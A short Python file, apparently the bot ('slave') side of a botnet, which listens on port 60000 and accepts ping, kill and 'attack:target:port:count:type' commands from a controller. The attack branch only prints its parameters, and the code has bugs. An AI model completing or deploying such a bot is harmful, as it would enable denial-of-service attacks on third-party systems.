from utils.socks import Server,Log
from utils import attacks
import socket
import time 

class SlaveServer(Server) :
    def handle_io(self,cl,addr) :
        client = cl 
        while True :
            cmd = client.recv(self.ReadBuffer).decode()
            print(f"Command {cmd}")
            if cmd == "ping" :
                print(Log("Ping Check"))
            elif cmd == "kill" :
                print(Log("Kill Code Received"))
                print(Log("Slave Exiting"))
                self.running = False
            elif cmd[:6] == 'attack' :
                cmd , target ,port , count , aType = cmd.split(':')
                aType = attacks[aType]
                print(f"Attack {cmd} {target} {port} {count} {aType}")
            else :
                try :
                    client.send(">>> ".encode())
                    client.send(cmd.encode())
                    if 'exit' in cmd.decode() :
                        client.close()
                        break
                except OSError :
                    print(Log("OSError {}".format(addr)))
                    client.close()
                    break
                except BaseException as e :
                    print(Log("{} cause by {}".format(e,addr)))
                    break
                finally :
                    print(Log("Connection with {} terminated".format(addr)))
            client.close()
            return

    def http_get(self) :
        pass

slave = SlaveServer(addr=("0.0.0.0",60000))
slave.start()